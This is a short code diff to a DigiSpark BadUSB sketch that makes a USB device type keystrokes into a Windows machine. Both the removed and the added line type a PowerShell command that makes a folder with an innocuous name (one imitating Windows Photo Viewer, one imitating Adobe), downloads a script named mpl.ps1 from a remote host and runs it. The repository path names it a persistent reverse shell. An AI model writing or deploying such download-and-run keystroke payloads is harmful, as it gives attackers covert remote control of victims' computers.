@@ -18,7 +18,7 @@ void loop() {
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
-  DigiKeyboard.print("mkdir 'C:/Program Files/Windows Photo Viewer/' ; cd 'C:/Program Files/Windows Photo Viewer/' ; powershell -command '& { iwr https://cdn.discordapp.com/attachments/670307829789360128/708066988328615986/mpl.ps1 -OutFile mpl.ps1 }'; ./mpl.ps1");
+  DigiKeyboard.print("mkdir Documents/Adobe/Common/BTX ; cd Documents/Adobe/Common/BTX ; powershell -command '& { iwr https://raw.githubusercontent.com/m00-git/DigiSparkProjects/master/PersistentDigiSparkReverseShell/mpl.ps1 -OutFile mpl.ps1 }'; ./mpl.ps1");
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
